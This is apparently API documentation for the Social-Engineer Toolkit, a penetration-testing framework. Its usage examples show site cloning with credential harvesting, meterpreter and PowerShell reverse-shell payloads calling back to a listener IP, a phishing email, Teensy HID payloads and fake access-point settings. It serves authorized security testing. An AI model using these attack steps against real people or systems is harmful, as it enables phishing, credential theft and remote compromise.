# Social-Engineer Toolkit (SET) - Comprehensive API Documentation

## Table of Contents
1. [Overview](#overview)
2. [Core APIs](#core-apis)
3. [Web Attack APIs](#web-attack-apis)
4. [Payload Generation APIs](#payload-generation-apis)
5. [Phishing APIs](#phishing-apis)
6. [Teensy HID APIs](#teensy-hid-apis)
7. [PowerShell APIs](#powershell-apis)
8. [QR Code APIs](#qr-code-apis)
9. [Wireless Attack APIs](#wireless-attack-apis)
10. [Module Handler APIs](#module-handler-apis)
11. [Web Server APIs](#web-server-apis)
12. [Usage Examples](#usage-examples)
13. [Configuration](#configuration)

## Overview

The Social-Engineer Toolkit (SET) is a comprehensive penetration testing framework designed for social engineering attacks. This documentation covers all public APIs, functions, and components available for developers and security professionals.

**Version:** 7.7.9  
**Author:** David Kennedy (ReL1K)  
**Company:** TrustedSec  

## Core APIs

### Core Module (`src.core.setcore`)

The core module provides fundamental functionality for the entire SET framework.

#### System Functions

```python
def check_os():
    """
    Check the operating system type.
    
    Returns:
        str: 'posix' for Unix-like systems, 'windows' for Windows
    """
```

```python
def definepath():
    """
    Get the main SET installation path.
    
    Returns:
        str: Path to SET installation directory
    """
```

#### Configuration Functions

```python
def check_config(param):
    """
    Check configuration file for a specific parameter.
    
    Args:
        param (str): Configuration parameter to check (e.g., "IPADDR=")
    
    Returns:
        str: Configuration value or empty string if not found
    """
```

```python
def update_options(option):
    """
    Update SET options in the configuration file.
    
    Args:
        option (str): Option to update in format "KEY=VALUE"
    """
```

#### Network Functions

```python
def detect_public_ip():
    """
    Auto-detect the public IP address.
    
    Returns:
        str: Public IP address
    """
```

```python
def validate_ip(address):
    """
    Validate if a string is a valid IPv4 address.
    
    Args:
        address (str): IP address to validate
    
    Returns:
        bool: True if valid IPv4 address, False otherwise
    """
```

```python
def grab_ipaddress():
    """
    Prompt user for IP address with validation.
    
    Returns:
        str: Validated IP address
    """
```

#### Metasploit Integration

```python
def meta_path():
    """
    Get the Metasploit installation path.
    
    Returns:
        str: Path to Metasploit installation or False if not found
    """
```

```python
def metasploit_shellcode(payload, ipaddr, port):
    """
    Generate Metasploit shellcode for a specific payload.
    
    Args:
        payload (str): Metasploit payload type
        ipaddr (str): Target IP address
        port (str): Target port
    
    Returns:
        str: Generated shellcode
    """
```

#### Utility Functions

```python
def print_status(message):
    """
    Print a status message with green formatting.
    
    Args:
        message (str): Message to print
    """
```

```python
def print_info(message):
    """
    Print an info message with blue formatting.
    
    Args:
        message (str): Message to print
    """
```

```python
def print_warning(message):
    """
    Print a warning message with yellow formatting.
    
    Args:
        message (str): Message to print
    """
```

```python
def print_error(message):
    """
    Print an error message with red formatting.
    
    Args:
        message (str): Message to print
    """
```

#### Menu System

```python
class create_menu:
    def __init__(self, text, menu):
        """
        Create an interactive menu.
        
        Args:
            text (str): Menu description text
            menu (list): List of menu options
        """
```

```python
def setprompt(category, text):
    """
    Create a formatted prompt for user input.
    
    Args:
        category (str): Prompt category
        text (str): Prompt text
    
    Returns:
        str: Formatted prompt string
    """
```

#### File Operations

```python
def site_cloner(website, exportpath, *args):
    """
    Clone a website for social engineering attacks.
    
    Args:
        website (str): URL of website to clone
        exportpath (str): Path to export cloned site
        *args: Additional arguments (e.g., "java" for Java applet attack)
    """
```

```python
def start_web_server(directory):
    """
    Start a web server in the specified directory.
    
    Args:
        directory (str): Directory to serve files from
    """
```

## Web Attack APIs

### Credential Harvester (`src.webattack.harvester.harvester`)

```python
class SETHandler(BaseHTTPRequestHandler):
    """
    Custom HTTP request handler for credential harvesting.
    
    Methods:
        do_GET(): Handle GET requests
        do_POST(): Handle POST requests and capture credentials
    """
```

```python
def run():
    """
    Start the credential harvester web server.
    """
```

### Web Clone (`src.webattack.web_clone.cloner`)

```python
def clone_website(url, output_dir):
    """
    Clone a website for social engineering attacks.
    
    Args:
        url (str): URL of website to clone
        output_dir (str): Directory to save cloned website
    """
```

### Tabnabbing (`src.webattack.tabnabbing.tabnabbing`)

```python
def setup_tabnabbing(target_url, redirect_url):
    """
    Set up tabnabbing attack vector.
    
    Args:
        target_url (str): URL to clone for tabnabbing
        redirect_url (str): URL to redirect after credential capture
    """
```

## Payload Generation APIs

### Main Payload Generator (`src.core.payloadgen.create_payloads`)

```python
def create_payload(payload_type, ipaddr, port):
    """
    Create a payload for social engineering attacks.
    
    Args:
        payload_type (str): Type of payload to create
        ipaddr (str): Target IP address
        port (str): Target port
    
    Returns:
        str: Path to generated payload file
    """
```

### Shellcode Generation

```python
def generate_shellcode(payload, ipaddr, port):
    """
    Generate shellcode using msfvenom.
    
    Args:
        payload (str): Metasploit payload type
        ipaddr (str): Target IP address
        port (str): Target port
    
    Returns:
        str: Generated shellcode
    """
```

```python
def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
    """
    Generate alphanumeric PowerShell payload.
    
    Args:
        payload (str): Base payload type
        ipaddr (str): Target IP address
        port (str): Target port
        payload2 (str): Secondary payload type
    
    Returns:
        str: Base64 encoded PowerShell payload
    """
```

## Phishing APIs

### SMTP Client (`src.phishing.smtp.client.smtp_web`)

```python
def mail(to, subject, prioflag1, prioflag2, text):
    """
    Send an email using SMTP.
    
    Args:
        to (str): Recipient email address
        subject (str): Email subject
        prioflag1 (str): Priority flag 1
        prioflag2 (str): Priority flag 2
        text (str): Email body text
    """
```

```python
def send_mass_email(filepath, subject, body):
    """
    Send mass emails from a file containing email addresses.
    
    Args:
        filepath (str): Path to file containing email addresses
        subject (str): Email subject
        body (str): Email body
    """
```

## Teensy HID APIs

### Teensy Generator (`src.teensy.teensy`)

```python
def writefile(filename, now):
    """
    Write Teensy HID attack file with IP address replacement.
    
    Args:
        filename (str): Source Teensy file name
        now (datetime): Current timestamp for file naming
    """
```

```python
def generate_teensy_payload(attack_type, ipaddr):
    """
    Generate Teensy HID payload for specific attack type.
    
    Args:
        attack_type (str): Type of Teensy attack
        ipaddr (str): Target IP address
    
    Returns:
        str: Path to generated .ino file
    """
```

## PowerShell APIs

### PowerShell Module (`src.powershell.powershell`)

```python
def generate_powershell_payload(payload_type, ipaddr, port):
    """
    Generate PowerShell payload for social engineering.
    
    Args:
        payload_type (str): Type of PowerShell payload
        ipaddr (str): Target IP address
        port (str): Target port
    
    Returns:
        str: Generated PowerShell command
    """
```

```python
def powershell_encodedcommand(ps_attack):
    """
    Create obfuscated PowerShell encoded command.
    
    Args:
        ps_attack (str): PowerShell attack command
    
    Returns:
        str: Obfuscated and encoded PowerShell command
    """
```

## QR Code APIs

### QR Code Generator (`src.qrcode.qrgenerator`)

```python
def gen_qrcode(url):
    """
    Generate QR code for a given URL.
    
    Args:
        url (str): URL to encode in QR code
    
    Returns:
        str: Path to generated QR code image
    """
```

## Wireless Attack APIs

### WiFi Attack (`src.wireless.wifiattack`)

```python
def setup_fake_access_point(interface, ssid, channel):
    """
    Set up a fake access point for wireless attacks.
    
    Args:
        interface (str): Wireless interface name
        ssid (str): SSID for fake access point
        channel (str): WiFi channel to use
    """
```

```python
def start_dhcp_server(subnet):
    """
    Start DHCP server for fake access point.
    
    Args:
        subnet (str): Subnet configuration
    """
```

## Module Handler APIs

### Third Party Modules (`src.core.module_handler`)

```python
def load_module(module_name):
    """
    Load a third-party module.
    
    Args:
        module_name (str): Name of module to load
    """
```

```python
def list_available_modules():
    """
    List all available third-party modules.
    
    Returns:
        list: List of available module names
    """
```

## Web Server APIs

### Web Server (`src.core.webserver`)

```python
class StoppableHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler with stop functionality.
    """
```

```python
def start_server(web_port, path):
    """
    Start the web server.
    
    Args:
        web_port (int): Port to run server on
        path (str): Directory to serve files from
    """
```

```python
def stop_server(web_port):
    """
    Stop the web server.
    
    Args:
        web_port (int): Port of server to stop
    """
```

## Usage Examples

### Basic SET Usage

```python
from src.core.setcore import *

# Check operating system
os_type = check_os()
print(f"Running on: {os_type}")

# Get IP address
ip = grab_ipaddress()
print(f"Target IP: {ip}")

# Create a menu
menu_text = "Select an attack vector:"
menu_options = ["1. Spearphishing", "2. Web Attack", "3. USB Attack"]
menu = create_menu(menu_text, menu_options)
```

### Credential Harvester Setup

```python
from src.webattack.harvester.harvester import SETHandler, run

# Clone a website
site_cloner("https://example.com", "/tmp/cloned_site")

# Start credential harvester
run()
```

### Payload Generation

```python
from src.core.payloadgen.create_payloads import create_payload

# Create a meterpreter payload
payload_path = create_payload("windows/meterpreter/reverse_tcp", "192.168.1.100", "4444")
print(f"Payload created: {payload_path}")
```

### Email Phishing

```python
from src.phishing.smtp.client.smtp_web import mail

# Send phishing email
mail("victim@example.com", "Important Security Update", "", "", "Please click here to update your account.")
```

### Teensy HID Attack

```python
from src.teensy.teensy import generate_teensy_payload

# Generate Teensy payload
ino_file = generate_teensy_payload("powershell_down", "192.168.1.100")
print(f"Teensy file created: {ino_file}")
```

### PowerShell Payload

```python
from src.powershell.powershell import generate_powershell_payload

# Generate PowerShell payload
ps_cmd = generate_powershell_payload("reverse_shell", "192.168.1.100", "443")
print(f"PowerShell command: {ps_cmd}")
```

### QR Code Generation

```python
from src.qrcode.qrgenerator import gen_qrcode

# Generate QR code
qr_path = gen_qrcode("http://192.168.1.100/malicious_site")
print(f"QR code saved to: {qr_path}")
```

## Configuration

### Main Configuration File

The main configuration file is located at `/etc/setoolkit/set.config`. Key configuration options include:

```bash
# Network Configuration
IPADDR=192.168.1.100
WEB_PORT=80
AUTO_DETECT=ON

# Metasploit Configuration
METASPLOIT_PATH=/usr/share/metasploit-framework/
METASPLOIT_MODE=ON

# Email Configuration
EMAIL_PROVIDER=gmail
SENDMAIL=OFF

# Apache Configuration
APACHE_SERVER=OFF
APACHE_DIRECTORY=/var/www/html

# SSL Configuration
WEBATTACK_SSL=OFF
SELF_SIGNED_CERT=OFF

# Harvester Configuration
HARVESTER_REDIRECT=OFF
HARVESTER_URL=
HARVESTER_LOG_PASSWORDS=ON

# Wireless Configuration
AIRBASE_NG_PATH=/usr/local/sbin/airbase-ng
DNSSPOOF_PATH=/usr/sbin/dnsspoof
ACCESS_POINT_SSID=FreeWiFi
AP_CHANNEL=6
```

### User Configuration

User-specific configuration is stored in `~/.set/set.options` and includes:

- Attack vector selections
- Payload configurations
- Target information
- Custom settings

### Module Configuration

Third-party modules can be placed in the `modules/` directory and should follow this format:

```python
#!/usr/bin/env python

MAIN="Your Module Name"

def main():
    """
    Main function for your module.
    This will be called when the module is selected.
    """
    print("Your module is running!")
```

## Security Considerations

⚠️ **IMPORTANT DISCLAIMER**: The Social-Engineer Toolkit is designed for authorized penetration testing and security assessments only. 

- Only use on systems you own or have explicit permission to test
- Ensure compliance with local laws and regulations
- Use responsibly and ethically
- Document all testing activities
- Obtain proper authorization before conducting any tests

## Support and Contributing

- **Documentation**: [User Manual](https://github.com/trustedsec/social-engineer-toolkit/raw/master/readme/User_Manual.pdf)
- **Issues**: [GitHub Issues](https://github.com/trustedsec/social-engineer-toolkit/issues)
- **Website**: [TrustedSec](https://www.trustedsec.com)
- **Twitter**: [@TrustedSec](https://twitter.com/TrustedSec)

## License

This project is licensed under the BSD 3-Clause License. See the LICENSE file for details.

---

*This documentation covers the Social-Engineer Toolkit version 7.7.9. For the most up-to-date information, please refer to the official repository.*